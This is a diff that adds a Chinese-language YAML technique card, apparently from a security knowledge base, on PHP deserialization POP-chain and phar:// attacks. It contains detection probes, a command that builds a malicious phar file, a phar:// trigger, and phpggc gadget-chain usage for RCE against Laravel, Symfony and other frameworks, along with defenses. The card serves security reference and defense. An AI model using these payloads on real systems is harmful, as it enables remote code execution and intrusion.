@@ -1,0 +1,84 @@
+# 技术卡片: 反序列化 - PHP POP 链
+# 分类: deserialization / php
+# 版本: 1.0
+# 日期: 2026-07-21
+# 来源: SecAtlas KB-DES-03 / HackTricks
+
+id: "deser-php-pop"
+name: "反序列化 - PHP POP 链攻击"
+category: "deserialization"
+subcategory: "php"
+severity: "critical"
+
+description: |
+  PHP unserialize() 自动调用 __wakeup() 和 __destruct() 魔术方法。
+  通过串联多个类的魔术方法构造 POP 链，实现文件操作、命令执行。
+  Phar 反序列化甚至无需显式调用 unserialize()。
+
+trigger_signals:
+  - "Cookie/POST 参数含序列化格式: O:数字:\"类名\":...{}"
+  - "应用使用 unserialize() 处理用户输入"
+  - "Phar:// 协议未禁用"
+  - "文件系统函数（file_exists/is_file/include）处理用户可控路径"
+
+payloads:
+  detection:
+    - probe: 'O:8:"stdClass":0:{}'
+      note: "空对象探测反序列化是否执行"
+    - probe: 'a:2:{i:0;s:4:"test";i:1;s:4:"test";}'
+      note: "数组探测"
+
+  phar_deserialization:
+    - technique: "构造恶意 phar 文件 → 上传 → phar:// 触发"
+    - command: |
+        php -r '
+        $phar = new Phar("evil.phar");
+        $phar->startBuffering();
+        $phar->addFromString("test.txt", "test");
+        $phar->setMetadata(new MyGadgetClass());
+        $phar->stopBuffering();
+        '
+    - trigger: "file_exists('phar://uploads/evil.jpg')"
+    - note: "文件扩展名任意，只要内部是 Phar 格式"
+
+  phpggc:
+    - tool: "phpggc (PHP Generic Gadget Chains)"
+    - usage: "phpggc Laravel/RCE1 system id | base64"
+    - targets:
+        - "Laravel: Laravel/RCE1-10"
+        - "Symfony: Symfony/RCE1-4"
+        - "WordPress: WordPress/PHPGGC 链"
+        - "ThinkPHP: ThinkPHP/RCE1-2"
+        - "Monolog: Monolog/RCE1-3"
+
+  magic_methods:
+    - "__wakeup(): 反序列化时自动调用"
+    - "__destruct(): 对象销毁时调用"
+    - "__toString(): 对象转字符串时调用"
+    - "__call(): 调用不可访问方法时触发"
+    - "__get/__set: 读写不可访问属性时触发"
+
+success_indicators:
+  - "文件被写入/读取（如 /tmp/pwned）"
+  - "命令执行回显"
+  - "OOB callback 确认 RCE"
+
+prerequisites:
+  - "PHP unserialize() 处理用户输入"
+  - "可利用的类存在且含魔术方法"
+  - "PHP 版本对应 POP 链兼容"
+
+defense:
+  - "禁止 unserialize() 处理用户输入"
+  - "必须使用时限制 allowed_classes 白名单"
+  - "使用 JSON 替代 PHP 序列化"
+  - "禁用 phar:// 协议"
+
+tools:
+  - "phpggc: https://github.com/ambionics/phpggc"
+  - "PHPGGC: 预置 Laravel/Symfony/WordPress 等框架 gadget 链"
+
+sources:
+  - kb: "KB-DES-03 / KB-DES-04"
+  - ref: "HackTricks: PHP Deserialization"
+  - ref: "CWE-502"
